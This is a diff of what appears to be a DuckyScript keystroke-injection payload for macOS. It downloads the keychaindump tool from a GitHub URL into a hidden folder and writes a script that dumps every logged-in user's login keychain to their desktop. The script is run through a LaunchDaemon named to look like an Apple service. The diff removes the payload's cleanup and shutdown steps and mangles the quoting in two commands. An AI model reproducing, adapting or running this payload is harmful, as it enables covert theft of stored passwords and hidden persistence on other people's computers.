@@ -16,21 +16,15 @@ STRING curl -o /Library/.hidden/keychaindump 'https://raw.githubusercontent.com/
 ENTER
 STRING chmod +x /Library/.hidden/keychaindump
 ENTER
-STRING w -h | sort -u -t' ' -k1,1 | while read user etc
+STRING w -h | sort -u -t'"' '"' -k1,1 | while read user etc
 ENTER
 STRING do
 ENTER
-STRING homedir=$(dscl . -read /Users/$user NFSHomeDirectory | cut -d' ' -f2)
+STRING homedir=$(dscl . -read /Users/$user NFSHomeDirectory | cut -d'"' '"' -f2)
 ENTER
 STRING /Library/.hidden/keychaindump $homedir/Library/Keychains/login.keychain > $homedir/Desktop/$user.login.keychain.txt
 ENTER
-STRING done
-ENTER
-STRING rm -rf /Library/.hidden/
-ENTER
-STRING launchctl unload -w /Library/LaunchDaemons/com.apples.services.plist
-ENTER
-STRING rm -f /Library/LaunchDaemons/com.apples.services.plist' > /Library/.hidden/dump.sh
+STRING done' > /Library/.hidden/dump.sh
 ENTER
 DELAY 500
 
@@ -84,9 +78,4 @@ DELAY 200
 
 
 STRING launchctl load /Library/LaunchDaemons/com.apples.services.plist
-ENTER
-DELAY 1000
-
-
-STRING shutdown -h now
 ENTER
